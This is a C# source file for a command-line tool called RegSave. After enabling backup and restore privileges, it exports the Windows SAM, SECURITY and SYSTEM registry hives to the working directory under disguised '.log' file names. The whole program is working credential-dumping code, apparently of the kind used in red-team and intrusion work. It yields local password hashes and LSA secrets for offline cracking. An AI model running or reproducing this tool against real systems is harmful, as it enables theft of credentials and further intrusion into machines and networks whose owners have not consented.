using System;
using System.IO;

namespace RegSave {
    public class Program {
        private static void DumpAll(string path) {
            Privileges.EnableDisablePrivilege("SeBackupPrivilege", true);
            Privileges.EnableDisablePrivilege("SeRestorePrivilege", true);
            Reg.ExportRegKey("SAM", Path.Combine(path, "sama.log"));
            Reg.ExportRegKey("SECURITY", Path.Combine(path, "secu.log"));
            Reg.ExportRegKey("SYSTEM", Path.Combine(path, "syse.log"));
        }

        private static void DumpSam(string path) {
            Privileges.EnableDisablePrivilege("SeBackupPrivilege", true);
            Privileges.EnableDisablePrivilege("SeRestorePrivilege", true);
            Reg.ExportRegKey("SAM", Path.Combine(path, "sama.log"));
            Reg.ExportRegKey("SYSTEM", Path.Combine(path, "syse.log"));
        }

        private static void DumpLsa(string path) {
            Privileges.EnableDisablePrivilege("SeBackupPrivilege", true);
            Privileges.EnableDisablePrivilege("SeRestorePrivilege", true);
            Reg.ExportRegKey("SECURITY", Path.Combine(path, "secu.log"));
            Reg.ExportRegKey("SYSTEM", Path.Combine(path, "syse.log"));
        }

        public static void Main(string[] args) {
            try {
                if (args.Length != 1) {
                    Console.WriteLine("bad argumets");
                    Environment.Exit(1);
                }
                string path = ".";
                if (args[0] == "all") {
                    DumpAll(path);
                } else if (args[0] == "sam") {
                    DumpSam(path);
                } else if (args[0] == "lsa") {
                    DumpLsa(path);
                }
                Console.WriteLine("done");
                Environment.Exit(0);
            } catch (Exception e) {
                Console.WriteLine(e.Message);
                Console.WriteLine(e.StackTrace);
                Environment.Exit(1);
            }
        }
    }
}
